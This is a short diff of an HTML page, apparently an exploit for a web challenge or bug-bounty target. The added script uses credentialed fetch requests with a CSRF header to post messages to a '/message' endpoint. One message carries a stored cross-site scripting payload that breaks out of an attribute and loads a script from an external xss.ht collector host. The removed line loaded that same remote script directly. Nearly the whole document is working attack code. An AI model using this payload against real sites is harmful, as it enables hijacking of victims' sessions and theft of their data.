@@ -1,5 +1,20 @@
 <html>
 <body>
-<script src=https://hrj.xss.ht></script>
+<script>
+csrf_header = new Headers();
+csrf_header.append('CSRF-Protection', '1');
+
+function sendMessage(msg) {
+  var url = '/message?msg=' + encodeURIComponent(msg)
+  if (window.last_recaptcha_widget !== undefined) {
+    url += '&captcha=' + encodeURIComponent(grecaptcha.getResponse(window.last_recaptcha_widget));
+    delete window.last_recaptcha_widget;
+  }
+  fetch(url, {headers: csrf_header, credentials: 'include'});
+}
+ 
+sendMessage("let me rename you"); 
+sendMessage('"><script src=https://hrj.xss.ht></script>');
+</script>
 </body>
 </html>
